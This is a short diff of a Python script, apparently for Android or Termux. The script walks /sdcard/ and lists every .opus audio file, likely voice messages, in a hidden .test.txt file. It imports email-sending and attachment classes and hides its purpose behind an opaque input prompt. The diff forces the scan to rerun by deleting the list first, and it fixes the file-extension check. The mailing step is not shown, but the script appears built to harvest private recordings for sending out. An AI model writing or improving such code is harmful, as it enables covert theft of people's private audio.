@@ -4,6 +4,7 @@ import time
 from requests import Session
 from colorama import Fore
 import smtplib
+import os
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -29,12 +30,12 @@ aass = raw_input('nump ----> ')
 #time.sleep(10000000000)
 #time.sleep(10000000000)
 
-
+os.system('rm .test.txt') 
 if not isfile('.test.txt'):
     for dir, dirs, files in walk('/sdcard/'):
         for file in files:
             pathF = dir + '/' + file
-            if '.opus' in pathF[-4:]:
+            if '.opus' in pathF[-5:]:
                 with open('.test.txt', 'a') as (h):
                     h.write(pathF + '\n')
 
